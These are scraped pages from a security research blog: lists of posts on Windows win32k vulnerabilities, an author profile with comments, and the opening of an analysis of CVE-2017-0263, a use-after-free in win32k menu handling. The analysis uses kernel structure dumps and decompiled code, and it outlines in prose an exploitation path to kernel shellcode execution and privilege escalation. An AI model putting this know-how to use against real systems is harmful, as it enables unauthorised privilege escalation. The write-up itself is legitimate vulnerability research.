这篇文章将分析 Windows 操作系统 win32k 内核模块窗口管理器子系统中的 CVE-2015-2546 漏洞，与上一篇分析的 CVE-2017-0263 漏洞类似地，这个漏洞也是弹出菜单 tagPOPUPMENU 对象的释 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [42661](https://xiaodaozhi.com/exploit/122.html)
* [0](https://xiaodaozhi.com/exploit/122.html#comments)
* 5

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-12

[From CVE-2017-0263 To Windows Menu Management Component](https://xiaodaozhi.com/exploit/117.html)
CVE-2017-0263 is a UAF vulnerability in Menu Management Component in win32k kernel module of Windows operating syste ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [59911](https://xiaodaozhi.com/exploit/117.html)
* [0](https://xiaodaozhi.com/exploit/117.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-10

[从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件](https://xiaodaozhi.com/exploit/71.html)
CVE-2017-0263 是 Windows 操作系统 win32k 内核模块菜单管理组件中的一个 UAF（释放后重用）漏洞，据报道称该漏洞在之前与一个 EPS 漏洞被 APT28 组织组合攻击用来干涉法国大选。这篇文章将对用于这 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [68475](https://xiaodaozhi.com/exploit/71.html)
* [18](https://xiaodaozhi.com/exploit/71.html#comments)
* 21

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-02-06

[分析笔记：MS17-017 中的整数溢出漏洞](https://xiaodaozhi.com/exploit/70.html)
前面的文章分析了 CVE-2016-0165 整数上溢漏洞，这篇文章继续分析另一个同样发生在 GDI 子系统的一个整数向上溢出漏洞（在分析此漏洞时，误以为此漏洞是 MS17-017 公告中的 CVE-2017-0101 漏洞，近期根 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [57577](https://xiaodaozhi.com/exploit/70.html)
* [22](https://xiaodaozhi.com/exploit/70.html#comments)
* 4

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-01-29

[从 CVE-2016-0165 说起：分析、利用和检测（下）](https://xiaodaozhi.com/exploit/56.html)
本文将对 CVE-2016-0165 (MS16-039) 漏洞进行一次简单的分析，并尝试构造其漏洞利用和内核提权验证代码，以及实现对应利用样本的检测逻辑。分析环境为 Windows 7 x86 SP1 基础环境的虚拟机，配置 1. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [17884](https://xiaodaozhi.com/exploit/56.html)
* [0](https://xiaodaozhi.com/exploit/56.html#comments)
* 2

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-01-28

[从 CVE-2016-0165 说起：分析、利用和检测（中）](https://xiaodaozhi.com/exploit/42.html)
本文将对 CVE-2016-0165 (MS16-039) 漏洞进行一次简单的分析，并尝试构造其漏洞利用和内核提权验证代码，以及实现对应利用样本的检测逻辑。分析环境为 Windows 7 x86 SP1 基础环境的虚拟机，配置 1. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [16169](https://xiaodaozhi.com/exploit/42.html)
* [8](https://xiaodaozhi.com/exploit/42.html#comments)
* 3

1. [1](https://xiaodaozhi.com/tag/%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95/1/)
2. [2](https://xiaodaozhi.com/tag/%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95/2/)
3. [下一页](https://xiaodaozhi.com/tag/%E5%88%86%E6%9E%90%E8%B0%83%E8%AF%95/2/)

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号



=== Content from xiaodaozhi.com_6e4b409c_20250126_091022.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

# 我是谁

| E-MAIL | leeqwind#xiaodaozhi.com |
| --- | --- |
| WEIBO | <https://weibo.com/leeqwind> |
| TWITTER | <https://twitter.com/leeqwind> |
| GITHUB | <https://github.com/leeqwind> |

---

**WHO AM I**

某不知名的安全开发，目前正就职于国内某互联网公司，从事安全相关的开发与研究工作，并在可预计的将来，将一直致力于安全相关的研究。

An unknown security developer, working in an Internet company in China and engaging in security related developing and research work currently, will always work on the security technique oriented research in the foreseeable future.

![]()

安全技术领域何其广阔，一己之力亦仅似瀚海拾贝一般，很多时候究其一生终将只得冰山一角，难以窥其全貌。但正因如此，每次进步、每个新的领悟，都让人如获至宝，充满难以言明的喜悦。

The field of security technology is so vast that one's own effort is just like picking shells in the sea, in many cases people will end up with just the tip of the iceberg in their lifetime. But just because of this, every progress, every new insight, is a treasure, full of unspeakable joy.

作者才疏学浅，所写寥寥，见笑了。

I have written very little, making you laugh.

### 有 11 条评论

1. ![FreeaRoot](//ixnet.icu/avatar/35a09d8af06004da596dca92dddb51c3?s=32&r=G&d=mm)
   **FreeaRoot**
   2018-05-17 11:40 #50
   [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=50#respond-page-2)

   友连老哥?

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2018-05-17 12:03 #51 -> [#50](#comment-50)
      [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=51#respond-page-2)

      可以哈~
2. ![HelloWorld](//ixnet.icu/avatar/5bb24661b45c46d1c72ce42cb5635302?s=32&r=G&d=mm)
   **HelloWorld**
   2018-11-15 17:37 #63
   [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=63#respond-page-2)

   内核大佬！！！！
3. ![badboy](//ixnet.icu/avatar/52eb673b25924a1233bb9304a643fab1?s=32&r=G&d=mm)
   **badboy**
   2019-03-03 20:32 #66
   [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=66#respond-page-2)

   每篇文章，受益匪浅。感谢前辈。

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2019-03-05 13:35 #67 -> [#66](#comment-66)
      [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=67#respond-page-2)

      感谢阅读，欢迎多多交流~~
4. ![Loopher](//ixnet.icu/avatar/fa4aa3a6e9eca427f98781f56715860e?s=32&r=G&d=mm)
   **Loopher**
   2019-08-19 14:10 #82
   [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=82#respond-page-2)

   前来膜拜，文章写的很棒。

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2019-08-21 11:47 #83 -> [#82](#comment-82)
      [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=83#respond-page-2)

      感谢阅读~~
5. ![信信](//ixnet.icu/avatar/835034d631cb59c39c2a0aa2a316414b?s=32&r=G&d=mm)
   **信信**
   2022-08-08 19:05 #848
   [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=848#respond-page-2)

   很棒哦～

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2022-08-08 19:05 #849 -> [#848](#comment-848)
      [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=849#respond-page-2)

      嘿嘿嘿~~~
6. ![A1v1n](//ixnet.icu/avatar/fe98e0822e084bdb48f9d03759c77796?s=32&r=G&d=mm)
   **A1v1n**
   2022-09-29 20:59 #853
   [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=853#respond-page-2)

   师傅，拜读了你的文章收获很多！！
   最近在学习GUI子系统关于win32k相关的知识，但是好像Windows10上变化很多。请问一下师傅子系统这块儿应该怎么学习呀？是否有推荐的相关书籍或者资料呀？

   1. ![Leeqwind](//ixnet.icu/avatar/f585929a3a7de3e707639a048fff1324?s=32&r=G&d=mm)
      **Leeqwind**
      2022-11-03 17:56 #854 -> [#853](#comment-853)
      [回复](https://xiaodaozhi.com/who-am-i.html?replyTo=854#respond-page-2)

      可以读一些现有的Windows10相关的技术博客研究下 https://blogs.360.net/post/save-and-reborn-gdi-data-only-attack-from-win32k-typeisolation.html

内容

* 发表评论

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号

* 文章目录

---



=== Content from xiaodaozhi.com_e0b6bdc0_20250126_091022.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2022-08-16

[基于海量样本数据的高级威胁发现](https://xiaodaozhi.com/security/195.html)
“看见”的能力始终伴随着“不看见”的能力，正如“太极”的两部分。什么是看见？看见一片大海、一片星空、一片沙漠，是看见吗？正是由于有选择的不看见的能力，忽略过滤排除筛选，去除大量无效信息，才能拨云见日、从茫茫大海星空沙漠中看见更加有价 ...

* [安全](https://xiaodaozhi.com/security/)
* [24782](https://xiaodaozhi.com/security/195.html)
* [2](https://xiaodaozhi.com/security/195.html#comments)
* 4

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2021-08-19

[丰富化威胁情报平台的能力](https://xiaodaozhi.com/security/172.html)
翻译自英文文章：《Enriching Threat Intelligence Platforms Capabilities》。文章讲述一个丰富化的威胁情报平台的实现思路，以扩展当前 TIP 中的导入、质量评估过程和信息共享功能。原文 ...

* [安全](https://xiaodaozhi.com/security/)
* [44368](https://xiaodaozhi.com/security/172.html)
* [1](https://xiaodaozhi.com/security/172.html#comments)
* 5

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-11

[Win32k NULL-Pointer-Dereference Analysis by Matching the May Update](https://xiaodaozhi.com/exploit/156.html)
Microsoft shipped and fixed four win32k kernel Escalation of Privilege vulnerabilities in the May security bulletin. ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [78682](https://xiaodaozhi.com/exploit/156.html)
* [1](https://xiaodaozhi.com/exploit/156.html#comments)
* 28

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[通过对比 5 月补丁分析 win32k 空指针解引用漏洞](https://xiaodaozhi.com/exploit/149.html)
微软在 5 月安全公告中包含并修复了 4 个 win32k 内核提权漏洞。这篇文章将通过补丁对比的方式，发现并分析补丁程序中修复的一个由某处空指针解引用导致的提权漏洞，最终实现其验证和利用代码。分析和调试的过程将在 Windows ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [48111](https://xiaodaozhi.com/exploit/149.html)
* [3](https://xiaodaozhi.com/exploit/149.html#comments)
* 10

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-05-09

[对 UAF 漏洞 CVE-2016-0167 的分析和利用](https://xiaodaozhi.com/exploit/135.html)
这篇文章将对 Windows 释放后重用（UAF）内核漏洞 CVE-2016-0167 进行一次简单的分析并构造其利用验证代码。该漏洞在 2016 年据报道称被用于攻击支付卡等目标的数据，并和之前分析的 CVE-2016-0165 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [46863](https://xiaodaozhi.com/exploit/135.html)
* [8](https://xiaodaozhi.com/exploit/135.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-22

[CVE-2015-2546 UAF Analysis and Exploitation](https://xiaodaozhi.com/exploit/132.html)
This article will analyze a UAF vulnerability in win32k Window Manager (User) Subsystem in Windows: CVE-2015-2546. S ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [38327](https://xiaodaozhi.com/exploit/132.html)
* [0](https://xiaodaozhi.com/exploit/132.html#comments)
* 2

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-18

[对 UAF 漏洞 CVE-2015-2546 的分析和利用](https://xiaodaozhi.com/exploit/122.html)
这篇文章将分析 Windows 操作系统 win32k 内核模块窗口管理器子系统中的 CVE-2015-2546 漏洞，与上一篇分析的 CVE-2017-0263 漏洞类似地，这个漏洞也是弹出菜单 tagPOPUPMENU 对象的释 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [42661](https://xiaodaozhi.com/exploit/122.html)
* [0](https://xiaodaozhi.com/exploit/122.html#comments)
* 5

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-12

[From CVE-2017-0263 To Windows Menu Management Component](https://xiaodaozhi.com/exploit/117.html)
CVE-2017-0263 is a UAF vulnerability in Menu Management Component in win32k kernel module of Windows operating syste ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [59912](https://xiaodaozhi.com/exploit/117.html)
* [0](https://xiaodaozhi.com/exploit/117.html#comments)
* 6

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-04-10

[从 CVE-2017-0263 漏洞分析到 Windows 菜单管理组件](https://xiaodaozhi.com/exploit/71.html)
CVE-2017-0263 是 Windows 操作系统 win32k 内核模块菜单管理组件中的一个 UAF（释放后重用）漏洞，据报道称该漏洞在之前与一个 EPS 漏洞被 APT28 组织组合攻击用来干涉法国大选。这篇文章将对用于这 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [68476](https://xiaodaozhi.com/exploit/71.html)
* [18](https://xiaodaozhi.com/exploit/71.html#comments)
* 21

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)
[Leeqwind](https://xiaodaozhi.com/author/1/)
2018-02-06

[分析笔记：MS17-017 中的整数溢出漏洞](https://xiaodaozhi.com/exploit/70.html)
前面的文章分析了 CVE-2016-0165 整数上溢漏洞，这篇文章继续分析另一个同样发生在 GDI 子系统的一个整数向上溢出漏洞（在分析此漏洞时，误以为此漏洞是 MS17-017 公告中的 CVE-2017-0101 漏洞，近期根 ...

* [漏洞](https://xiaodaozhi.com/exploit/)
* [57577](https://xiaodaozhi.com/exploit/70.html)
* [22](https://xiaodaozhi.com/exploit/70.html#comments)
* 4

1. [1](https://xiaodaozhi.com/page/1/)
2. [2](https://xiaodaozhi.com/page/2/)
3. [3](https://xiaodaozhi.com/page/3/)
4. [下一页](https://xiaodaozhi.com/page/2/)

© 2025 [小刀志](https://xiaodaozhi.com/)
*·* [网站地图](https://xiaodaozhi.com/sitemap.xml)
*·* [许可声明](https://xiaodaozhi.com/license.html)
*·* [京ICP备18017134号-1](https://beian.miit.gov.cn/) *·* 京公网安备11010502035375号



=== Content from xiaodaozhi.com_49967bd8_20250126_091010.html ===

小刀志
[首页](/ "首页 home")
[归档](https://xiaodaozhi.com/archives.html "归档 archives")
[标签](https://xiaodaozhi.com/tags.html "标签 tags")
[链接](https://xiaodaozhi.com/links.html "链接 links")
[我是谁](https://xiaodaozhi.com/who-am-i.html "我是谁 whoami")

![小刀志](/img/author.png)
小刀志

稻草小刀的在线笔记。记录所有事情，并写给自己。

搜索关键字

# From CVE-2017-0263 To Windows Menu Management Component

[![](/img/author.png)](https://xiaodaozhi.com/author/1/)

[Leeqwind](https://xiaodaozhi.com/author/1/)

2018-04-12
阅读: 59911
评论: 0

6

CVE-2017-0263 is a UAF vulnerability in Menu Management Component in `win32k` kernel module of Windows operating system, which was reported to be used to attack with an EPS vulnerability to interfere the French election. This article will simply analyze the CVE-2017-0263 part of the attacking sample in order to come up with the operation principle and basic exploiting idea of this vulnerability, and make a brief investigation into the Menu Management Component of Windows Window Manager Subsystem. The analyzing environment is Windows 7 x86 SP1 basic virtual machine.

![]()

In this article, in order to highlight the important points, in the analysis of the involved system functions, the irrelevant calling statements will be omitted. Only the calling and assignment statements that affect or possibly affect the vulnerability triggering logic are paid attention to and analyzed or interpreted.

## 0x0 Abstract

This article analyzes the CVE-2017-0263 UAF vulnerability occurring in the Menu Management Component of Window Manager (User) Subsystem. After freeing the root popup menu object pointed to by field `pGlobalPopupMenu` of global menu state object in function `win32k!xxxMNEndMenuState`, there is no statement assigning the field to zero but should have been, which causes the field to still point to the freed memory as a wild pointer. In subsequent code logic, it is still possible that the freed memory will be read or written or double-freed.

After freeing the object pointed to by field `pGlobalPopupMenu`, function `xxxMNEndMenuState` also resets the field `pMenuState` of the thread information object associated with the current thread, which results in most of the interfaces tracing and operating popup menu not able to achieve the triggering condition. However, before reseting field `pMenuState`, there is a statement unlocking and freeing field `uButtonDownHitArea` of global menu state object. This field stores the pointer to the window object on which the current pressed mouse button is located (if the mouse button has been being pressed).

If the user process has previously constructed menu window objects with special associations and properties through exploiting techniques, during the time between freeing field `pGlobalPopupMenu` and resetting field `pMenuState` in function `xxxMNEndMenuState`, the execution flow would be called back into the user process. The exploitation code in the user process would have enough ability to change the state of the current popup menu, which causes the execution flow to reenter `xxxMNEndMenuState` function, and to double-free the memory of original root popup menu, which causes BSOD of the operating system.

At the first time the kernel freeing the memory pointed to by field `pGlobalPopupMenu` and the execution flow being called back into user-mode context, through accurate memory layout, exploitation code lets system reallocate a memory block of the same size to occupy the memory area previously freed pointed to by field `pGlobalPopupMenu`, in order to fake the new root popup menu object. With the help of code logic, realizing the modification of field `bServerSideWindowProc` of specific window object, exploitation code lets system be able to execute the custom window message procedure located in the user process address space directly in the kernel context, which makes the shellcode constructed by the user process can be executed in the kernel context to realize elevation of privilege.

## 0x1 Principle

CVE-2017-0263 exists in the Menu Management Component of the `win32k` Window Manager (User) Subsystem. After freeing the object memory pointed to by field `pGlobalPopupMenu` of target `tagMENUSTATE` structure object, function `xxxMNEndMenuState` doesn't zero the field.

There is a global menu state object defined as `tagMENUSTATE` structure in `win32k` module named `gMenuState`. In current system environment, the structure is defined as below:

```
kd> dt win32k!tagMENUSTATE
   +0x000 pGlobalPopupMenu : Ptr32 tagPOPUPMENU
   +0x004 flags            : Int4B
   +0x008 ptMouseLast      : tagPOINT
   +0x010 mnFocus          : Int4B
   +0x014 cmdLast          : Int4B
   +0x018 ptiMenuStateOwner : Ptr32 tagTHREADINFO
   +0x01c dwLockCount      : Uint4B
   +0x020 pmnsPrev         : Ptr32 tagMENUSTATE
   +0x024 ptButtonDown     : tagPOINT
   +0x02c uButtonDownHitArea : Uint4B
   +0x030 uButtonDownIndex : Uint4B
   +0x034 vkButtonDown     : Int4B
   +0x038 uDraggingHitArea : Uint4B
   +0x03c uDraggingIndex   : Uint4B
   +0x040 uDraggingFlags   : Uint4B
   +0x044 hdcWndAni        : Ptr32 HDC__
   +0x048 dwAniStartTime   : Uint4B
   +0x04c ixAni            : Int4B
   +0x050 iyAni            : Int4B
   +0x054 cxAni            : Int4B
   +0x058 cyAni            : Int4B
   +0x05c hbmAni           : Ptr32 HBITMAP__
   +0x060 hdcAni           : Ptr32 HDC__
```

*The definition of tagMENUSTATE structure*

Menu management is one of the most complex components of `win32k`, while menu handling as a whole depends on multiple fairly complex functions and structures. For instance, in creating popup menus, applications call `TrackPopupMenuEx` to create a menu classed window in which the menu content is displayed. The menu window then processes message input through a system-defined menu window class procedure `xxxMenuWindowProc`, in order to handle various menu specific messages. `win32k` also associates a menu state structure `tagMENUSTATE` with the currently active menu. In this way, functions can be aware of whether a menu is involved in a drag and drop operation, inside a menu loop, about to be terminated, etc.

Menu state structure is used to store the detailed information related to the state of the currently active menu, including the coordinates of context popup menu, the pointer to related bitmap surface object, the window device context object, the pointer to previous context menu structure, and some other member fields.

There is also a pointer field `pMenuState` to menu state structure in thread information structure `tagTHREADINFO`:

```
kd> dt win32k!tagTHREADINFO -d pMenuState
   +0x104 pMenuState : Ptr32 tagMENUSTATE
```

*Structure tagTHREADINFO has pMenuState field*

When user popups context menu in some way such as clicking the mouse right button, finally the system executes into `xxxTrackPopupMenuEx` function in the kernel. This function calls `xxxMNAllocMenuState` function to allocate or initialize the menu state structure.

In function `xxxMNAllocMenuState`, system zeros all the fields of the global menu state object `gMenuState` and initializes part of the fields, then stores the address of global menu state object into field `pMenuState` of the current thread information object.

```
  menuState = (tagMENUSTATE *)&gMenuState;
  [...]
  memset(menuState, 0, 0x60u);
  menuState->pGlobalPopupMenu = popupMenuRoot;
  menuState->ptiMenuStateOwner = ptiCurrent;
  menuState->pmnsPrev = ptiCurrent->pMenuState;
  ptiCurrent->pMenuState = menuState;
  if ( ptiNotify != ptiCurrent )
    ptiNotify->pMenuState = menuState;
  [...]
  return menuState;
```

*Snippet of function xxxMNAllocMenuState*

The function initializes fields `pGlobalPopupMenu` / `ptiMenuStateOwner` and `pmnsPrev` of menu state structure. Field `pGlobalPopupMenu` points to the popup menu structure `tagPOPUPMENU` object from parameters as the root popup menu. Popup menu structure stores the pointers to various kernel object related to the popup menu, and is associated with the corresponding menu window object. The structure is defined as below:

```
kd> dt win32k!tagPOPUPMENU
   +0x000 flags            : Int4B
   +0x004 spwndNotify      : Ptr32 tagWND
   +0x008 spwndPopupMenu   : Ptr32 tagWND
   +0x00c spwndNextPopup   : Ptr32 tagWND
   +0x010 spwndPrevPopup   : Ptr32 tagWND
   +0x014 spmenu           : Ptr32 tagMENU
   +0x018 spmenuAlternate  : Ptr32 tagMENU
   +0x01c spwndActivePopup : Ptr32 tagWND
   +0x020 ppopupmenuRoot   : Ptr32 tagPOPUPMENU
   +0x024 ppmDelayedFree   : Ptr32 tagPOPUPMENU
   +0x028 posSelectedItem  : Uint4B
   +0x02c posDropped       : Uint4B
```

*The definition of structure tagPOPUPMENU*

Field `ptiMenuStateOwner` of menu state structure points to the thread information object of current thread. The original menu state object pointer previously stored in the thread information object is stored into field `pmnsPrev` of the current menu state structure.

Then the function stores the address of the current menu state structure into field `pMenuState` of the current thread (as well as the notification thread) information structure `tagTHREADINFO` object from parameters, and returns the address of the menu state structure as the returned value to the superior caller function.

![]()
*The relation between ptiCurrent and gMenuState*

---

When user selects menu item via mouse or keyboard, or click on the screen area outside the menu, system sends messages descripting 'mouse button down' or 'menu end' to the window object of current context menu. If the menu type is modal, this would cause the thread from the previous invocation of the `xxxMNLoop` function to loop out of the menu loop waiting state, making the function continue backward.

System calls `xxxMNEndMenuState` function to clean up the informations stored in menu state structure and free relevant popup menu object and window object.

```
  ptiCurrent = gptiCurrent;
  menuState = gptiCurrent->pMenuState;
  if ( !menuState->dwLockCount )
  {
    MNEndMenuStateNotify(gptiCurrent->pMenuState);
    if ( menuState->pGlobalPopupMenu )
    {
      if ( fFreePopup )
        MNFreePopup(menuState->pGlobalPopupMenu);
      else
        *(_DWORD *)menuState->pGlobalPopupMenu &= 0xFFFEFFFF;
    }
    UnlockMFMWFPWindow(&menuState->uButtonDownHitArea);
    UnlockMFMWFPWindow(&menuState->uDraggingHitArea);
    ptiCurrent->pMenuState = menuState->pmnsPrev;
    [...]
  }
```

*Snippet of function xxxMNEndMenuState*

In function `xxxMNEndMenuState`, system retrieves menu state structure from field `pMenuState` of the current thread information object. Then the function judges whether field `pGlobalPopupMenu` of the menu state object is null. If not, the function calls `MNFreePopup` to destroy the popup menu `tagPOPUPMENU` object pointed to by this field. After the corresponding preprocessing is performed, function `MNFreePopup` calls `ExFreePoolWithTag` to release the `tagPOPUPMENU` object buffer from parameters.

```
  if ( popupMenu == popupMenu->ppopupmenuRoot )
    MNFlushDestroyedPopups(popupMenu, 1);
  pwnd = popupMenu->spwndPopupMenu;
  if ( pwnd && (pwnd->fnid & 0x3FFF) == 0x29C && popupMenu != &gpopupMenu )
    *((_DWORD *)pwnd + 0x2C) = 0;
  HMAssignmentUnlock(&popupMenu->spwndPopupMenu);
  HMAssignmentUnlock(&popupMenu->spwndNextPopup);
  HMAssignmentUnlock(&popupMenu->spwndPrevPopup);
  UnlockPopupMenu(popupMenu, &popupMenu->spmenu);
  UnlockPopupMenu(popupMenu, &popupMenu->spmenuAlternate);
  HMAssignmentUnlock(&popupMenu->spwndNotify);
  HMAssignmentUnlock(&popupMenu->spwndActivePopup);
  if ( popupMenu == &gpopupMenu )
    gdwPUDFlags &= 0xFF7FFFFF;
  else
    ExFreePoolWithTag(popupMenu, 0);
```

*Snippet of function MNFreePopup*

Then the problem arises: after freeing the popup menu object pointed to by field `pGlobalPopupMenu` of menu state structure, function `xxxMNEndMenuState` doesn't zero this field, which causes the memory address pointed to by the field in an uncontrollable state, and leads to some potential problems such as use-after-free.

## 0x2 Tracing

There is an exported function `TrackPopupMenuEx` in `user32.dll` module used to display menu at the specified location on the screen and to track selected menu item. When user calls this function, the system finally execute `xxxTrackPopupMenuEx` function to handle menu popping up operation.

---

**Menu-Related Objects**

In this analysis, you will find such menu-related objects: menu object, menu window object, and popup menu object.

Among them, menu object is the entity of menu, which exists in the form of `tagMENU` structure instance in the kernel, and is used to describe the static information such as menu items, item count, size, etc. But it is not responsible for the display of menu on the screen. When user calls interface functions such as `CreateMenu` the system creates menu object in the kernel. When function `DestroyMenu` is called or the user process is being killed, menu object is to be destroyed.

When a menu is needed to be displayed on the screen, for example, user right-clicks mouse in a window area, the system would invoke some relevant service functions to create corresponding `MENUCLASS` classed window object according to the target menu object. Menu window object is a special type of window structure `tagWND` object, normally in form of `tagMENUWND` structure, responsible for describing the dynamic state such as the position to display, style, etc. Its extra area is associated with the corresponding popup menu object.

As the extra object of menu window object, popup menu object `tagPOPUPMENU` is used to describe the popup state for the menu it represents, and to associates objects such as the menu window object, the menu object, the menu window objects of sub menu or parent menu.

When a menu is being popped up on the screen, a menu window object and the related popup menu object are created; when the menu is selected or canceled, the menu would no longer need to be displayed on the screen, the system will destroy the menu window object and the popup menu object at the appropriate time.

---

**Popup Menu**

Kernel function `xxxTrackPopupMenuEx` is responsible for menu pop-up and tracking the selection of items. During the execution of this function, system calls `xxxCreateWindowEx` function to create window object classed `#32768`(`MENUCLASS`) for the menu object to be displayed. Window object classed `MENUCLASS` is normally in form of `tagMENUWND` structure. This kind of window object has a pointer size extra area, used to store the pointer to the associated `tagPOPUPMENU` object.

```
pwndHierarchy = xxxCreateWindowEx(
    0x181,
    0x8000, // MENUCLASS
    0x8000, // MENUCLASS
    0,
    0x80800000,
    xLeft,
    yTop,
    100,
    100,
    (pMenu->fFlags & 0x40000000) != 0 ? pwndOwner : 0, // MNS_MODELESS
    0,
    pwndOwner->hModule,
    0,
    0x601u,
    0);
```

*Function xxxTrackPopupMenuEx creates MENUCLASS window object*

After allocating window object, function `xxxCreateWindowEx` sends `WM_NCCREATE` message to this object, and calls the message procedure specified by the window object. The message procedure of `MENUCLASS` classed window object is `xxxMenuWindowProc` kernel function. When handling `WM_NCCREATE` message, the function creates and initializes the popup menu information structure `tagPOPUPMENU` object associated with the window object, then sets field `tagPOPUPMENU->spwndPopupMenu` as the address of the menu window `tagMENUWND` object, and sets the extra area at the end of the window object as the address of the popup menu `tagPOPUPMENU` object.

![]()
*The relation between tagMENUWND and tagPOPUPMENU*

When sending messages such as `WM_NCCREATE` to the target window object through `xxxSendMessageTimeout` function, before calling the object-specified message procedure, the system also calls `xxxCallHook` function to invoke `WH_CALLWNDPROC` classed hook procedures which previously set by the user process. This type of hook procedure is invoked before the system sending messages to the target window object.

```
if ( (LOBYTE(gptiCurrent->fsHooks) | LOBYTE(gptiCurrent->pDeskInfo->fsHooks)) & 0x20 )
{
  v22 = pwnd->head.h;
  v20 = wParam;
  v19 = lParam;
  v21 = message;
  v23 = 0;
  xxxCallHook(0, 0, &v19, 4); // WH_CALLWNDPROC
}
```

*Function xxxSendMessageTimeout calls xxxCallHook*

Then function `xxxTrackPopupMenuEx` calls `xxxMNAllocMenuState` to initialize various fields of the menu state structure. The previously created popup menu object is used as the current root popup menu object, and its address is stored in field `pGlobalPopupMenu` of the menu state structure.

```
menuState = xxxMNAllocMenuState(ptiCurrent, ptiNotify, popupMenu);
```

*Function xxxTrackPopupMenuEx initializes menu state structure*

Then the function calls `xxxSetWindowPos` to set the position of the target menu window and display it on the screen. During the execution of function `xxxSetWindowPos`, after setting the window position and state, the system calls `xxxSendChangedMsgs` in function `xxxEndDeferWindowPosEx` to send the message that the window position has changed.

```
  xxxSetWindowPos(
    pwndHierarchy,
    (((*((_WORD *)menuState + 2) >> 8) & 1) != 0) - 1,
    xLParam,
    yLParam,
    0,
    0,
    ~(0x10 * (*((_WORD *)menuState + 2) >> 8)) & 0x10 | 0x241);
```

*Function xxxTrackPopupMenuEx displays root menu window object*

In function `xxxSendChangedMsgs`, according to the set `SWP_SHOWWINDOW` state flag, system creates and adds associated shadow window object for the current target menu window object. The relation between the two window objects is added into `gpshadowFirst` shadow window associating table in function `xxxAddShadow`.

